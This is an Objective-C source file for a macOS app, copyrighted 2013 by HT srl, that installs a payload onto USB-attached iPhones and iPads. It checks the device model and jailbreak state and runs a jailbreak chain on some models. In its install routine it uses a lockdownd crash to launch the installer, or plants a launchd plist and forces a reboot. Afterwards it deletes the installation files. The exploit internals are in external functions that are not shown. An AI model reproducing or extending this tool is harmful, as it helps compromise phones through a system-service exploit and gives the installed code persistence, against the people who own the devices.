 //
//  AppDelegate.m
//  Install
//
//  Created by Massimo Chiodini on 2/7/13.
//  Copyright (c) 2013 HT srl. All rights reserved.
//

#import "AppDelegate.h"
#import "iOSUsbSupport.h"

#define NOT_INSTALL       0
#define TRY_NON_JBINSTALL 1
#define TRY_JBINSTALL     2
#define view_print(x) [self tPrint: @x]

extern int installios1(char *iosfolder);
extern int installios2(char *iosfolder);
extern int installios3(char *iosfolder);

static int  gIsJailbreakable = TRY_JBINSTALL;
static BOOL gIsDeviceAttached = FALSE;
static NSString *gIosInstallationPath = nil;
static NSString *gModel = nil;
static NSString *gVersion = nil;

@implementation AppDelegate

- (void)dealloc
{
    [super dealloc];
}

#pragma mark -
#pragma mark Dialog message function
#pragma mark -

- (void)tPrint:(NSString*)theMsg
{
  [mMessage setStringValue: theMsg];
}

- (void)setIcon:(NSString*)theIcon
{
  NSString *imagePath = [NSString stringWithFormat:@"%@",
                         [[NSBundle mainBundle] pathForResource:theIcon
                                                         ofType:@"png"]];
  
  NSImage *activeIcon = [[NSImage alloc] initWithContentsOfFile: imagePath];
  
  [mIcon setImage:activeIcon];
}

#pragma mark -
#pragma mark Info device
#pragma mark -

char *models[] = {"iPhone1,1",
                  "iPhone1,2",
                  "iPhone2,1",
                  "iPhone3,1",
                  "iPhone3,2",
                  "iPhone3,3",
                  "iPhone4,1",
                  "iPhone5,1",
                  "iPhone5,2",
                  "iPad1,1",
                  "iPad2,1",
                  "iPad2,2",
                  "iPad2,3",
                  "iPad2,4",
                  "iPad3,1",
                  "iPad3,2",
                  "iPad3,3",
                  "iPad3,4",
                  "iPad3,5",
                  "iPad3,6",
                  NULL};

NSString *models_name[] =  {@"iPhone",
                            @"iPhone 3G",
                            @"iPhone 3GS",
                            @"iPhone 4",
                            @"iPhone 4",
                            @"iPhone 4(cdma)",
                            @"iPhone 4s",
                            @"iPhone 5(gsm)",
                            @"iPhone 5",
                            @"iPad",
                            @"iPad2(wi-fi)",
                            @"iPad2(gsm)",
                            @"iPad2(cdma)",
                            @"iPad2(wi-fi)",
                            @"iPad3(wi-fi)",
                            @"iPad3(gsm)",
                            @"iPad3",
                            @"iPad4(wi-fi)",
                            @"iPad4(gsm)",
                            @"iPad4",
                            NULL};
- (void)setModel
{
  int i = 0;
  
  NSString *theModel = @"Unknown device";
  
  char *_model = get_model();
  char *_version = get_version();
  
  if (_model == NULL)
   _model = "Unknown device";
  if (_version == NULL)
    _version = "Unknown version";
  
  while (models[i] != NULL)
  {
    if (strcmp(models[i], _model) == 0)
    {
      theModel = models_name[i];
      break;
    }
    i++;
  }
  
  NSString *msg = [NSString stringWithFormat:@"Model: %@\nVersion: %s",
                                             theModel,
                                             _version];
  
  [mModel setStringValue: msg];
  
  gModel    = theModel;
  gVersion  = [[NSString alloc] initWithFormat:@"%s", _version];
}

- (void)resetModel
{
  [mModel setStringValue: @""];
}

#pragma mark -
#pragma mark Check device thread
#pragma mark -

- (int)checkInstallationMode
{
  if (check_lockdownd_config() == TRUE)
  {
    return TRY_JBINSTALL;
  }
  else
  {
    if ([gModel compare:@"iPhone 3GS"] == NSOrderedSame &&
        [gVersion compare:@"4.1"] == NSOrderedSame)
      return TRY_NON_JBINSTALL;
  }
  
  return NOT_INSTALL;
}

- (void)waitForDevice:(id)anObject
{  
  BOOL isAttached = (BOOL)isDeviceAttached();
  
  if (isAttached == TRUE)
  {        
    [self setIcon:@"iphone"];
    
    [self setModel];
    
    [self tPrint:@"check device..."];
    
    gIsJailbreakable = [self checkInstallationMode];
    
    switch (gIsJailbreakable)
    {
      case TRY_NON_JBINSTALL:
      {
        [self setIcon:@"iphone jb"];
        break;
      }
      case NOT_INSTALL:
      {
        [self tPrint:@"cannot install device!"];
        return;
      }
    }
    
    if (check_installation(1, 2) == 0)
    {
      [self tPrint:@"check device... device is ready."];
      
      if (gIosInstallationPath != nil)
        [mInstall setEnabled:YES];
      
      gIsDeviceAttached = TRUE;
    }
    else
    {
      [self tPrint:@"check device... installation detected!"];
      // force remove of installation files (in case of manually reboot)
      remove_installation();
      gIsDeviceAttached = FALSE;
    }
  }
  else
  {
    [self tPrint:@"cannot connect to device!"];
  }
}

#pragma mark -
#pragma mark Entry notification
#pragma mark -

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
  view_print("Waiting for device...");
  
  sleep(1);
  
  gIosInstallationPath = [self getIosPath];
  
  if (gIosInstallationPath == nil)
  {
    [self alertForCoreDirectory:@"iOS installation directory not found!"
                   andAlternate:nil];
  }
  
  [NSThread detachNewThreadSelector:@selector(waitForDevice:)
                           toTarget:self
                         withObject:nil];
}

#pragma mark -
#pragma mark iOS installation folder routine
#pragma mark -

- (NSInteger)alertForCoreDirectory:(NSString*)messageText
                      andAlternate:(NSString*)alternate
{
  NSAlert *alert = [NSAlert alertWithMessageText:messageText
                                   defaultButton:@"Ok"
                                 alternateButton:alternate
                                     otherButton:nil
                       informativeTextWithFormat:@" "];
                    
  return [alert runModal];
}

- (NSString*)askForCoreDirectory
{
  NSString *installPath = nil;

  NSOpenPanel* openDlg = [NSOpenPanel openPanel];

  [openDlg setCanChooseFiles:NO];

  [openDlg setCanChooseDirectories:YES];

  if ( [openDlg runModal] == NSOKButton )
  {
    NSArray* files = [openDlg URLs];

    NSURL *_installUrl = [files objectAtIndex:0];
    
    installPath = [[[_installUrl path] retain] autorelease];
  }
  
  return installPath;
}

- (NSString*)getIosPath
{
  NSString *iosPath = [NSString stringWithFormat:@"%@/../../ios",
                                                [[NSBundle mainBundle] bundlePath]];
  
  NSString *installPath =[NSString stringWithFormat:@"%@/install.sh",
                                                    iosPath];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath:installPath] == TRUE)
    return [iosPath retain];
  
  if ([self alertForCoreDirectory:@"iOS installation directory not found: please select one"
                     andAlternate:@"Cancel"] == NSAlertAlternateReturn)
    return nil;
  
  iosPath = [self askForCoreDirectory];
  
  if (iosPath == nil)
    return nil;
  
  installPath =[NSString stringWithFormat:@"%@/install.sh", iosPath];
    
  if ([[NSFileManager defaultManager] fileExistsAtPath:installPath] == FALSE)
    return nil;
  
  return [iosPath retain];
}

#pragma mark -
#pragma mark Installation routine
#pragma mark -

- (void)startInstallation:(id)anObject
{
  int isDeviceOn = 0;
  int retInst = 0;
  
  view_print("start installation...");
  
  if (gIsJailbreakable == TRY_NON_JBINSTALL)
  {
    // running jb tool for iphone3gs-4.1
    int ret = 0;
    
    view_print("Setup device for installation...");
    
    ret = installios1((char*)[gIosInstallationPath cStringUsingEncoding:NSUTF8StringEncoding]);
    
    if (ret == 0)
    {
      view_print("Setup failed!");
      return;
    }
    
    view_print("Preparing device for execute installation...");
    
    ret = installios2((char*)[gIosInstallationPath cStringUsingEncoding:NSUTF8StringEncoding]);
    
    if (ret == 0)
    {
      view_print("Preparation failed!");
      return;
    }
    
    view_print("Trying execute installation...");
    
    ret = installios3((char*)[gIosInstallationPath cStringUsingEncoding:NSUTF8StringEncoding]);
    
    if (ret == 0)
    {
      view_print("execution failed!");
      return;
    }
    
    goto check_point;
    
    return;
  }
  
  NSString *path = gIosInstallationPath;
  
  if (path == nil)
  {
    view_print("cannot found installation dir!");
    goto exit_point;
  }
  
  char *lpath = (char*)[path cStringUsingEncoding:NSUTF8StringEncoding];
  
  char **dir_content = list_dir_content(lpath);
  
  if (dir_content == NULL)
  {
    view_print("cannot found installation component!");
    goto exit_point;
  }
  
  if (make_install_directory() != 0)
  {
    view_print("cannot create installation folder!");
    goto exit_point;
  }
  
  view_print("copy files...");
  
  if (copy_install_files(lpath, dir_content) != 0)
  {
    view_print("cannot copy files into installation folder!");
    goto exit_point;
  }
    
  view_print("copy files... done.");
  
  sleep(1);
  
  // Ok: using lockdownd crash for running installer...
  view_print("try to run installer...");
  
  if (lockd_run_installer() == 1)
  {
    view_print("try to run installer... done.");
    retInst = 1;
    goto exit_point;
  }
  
  // end.
  
  if (create_launchd_plist() != 0)
  {
    view_print("cannot create plist files!");
    goto exit_point;
  }
  
  view_print("try to restart device...");
  
  int retVal = restart_device();
  
  if (retVal == 1)
    view_print("try to restart device...restarting: please wait.");
  else
    view_print("can't restart device: try it manually!");
  
  [mInstall setEnabled:NO];
  
  sleep(3);
  
  // Wait for device off
  do
  {
    isDeviceOn = isDeviceAttached();
    
    sleep(1);
  
  } while(isDeviceOn == 1);
  
  [self setIcon:@"iphone grayed"];
  
  view_print("device disconnected. Please wait...");
  
  [self resetModel];
  
  // wait device on
  do
  {
    isDeviceOn = isDeviceAttached();
    
    sleep(1);
  
  } while(isDeviceOn == 0);
  
  view_print("device connected.");
  
  [self setIcon:@"iphone"];
  
  [self setModel];

check_point:
  view_print("checking installation...");
  
  sleep(5);
  
  retInst = check_installation(10, 10);
  
  // On fail remove the install files e dir...
exit_point:
  
  remove_installation();
  
  if ( retInst == 1)
  {
    view_print("installation done.");
  }
  else
  {
    view_print("installation failed: please retry!");
  }
}

#pragma mark -
#pragma mark Button actions
#pragma mark -

- (IBAction)install:(id)sender
{
  if (gIsDeviceAttached == FALSE)
    return;
  
  [NSThread detachNewThreadSelector:@selector(startInstallation:)
                           toTarget:self
                         withObject:nil];
  
  [mInstall setEnabled: FALSE];
}

- (IBAction)cancel:(id)sender
{
  exit(0);
}

@end
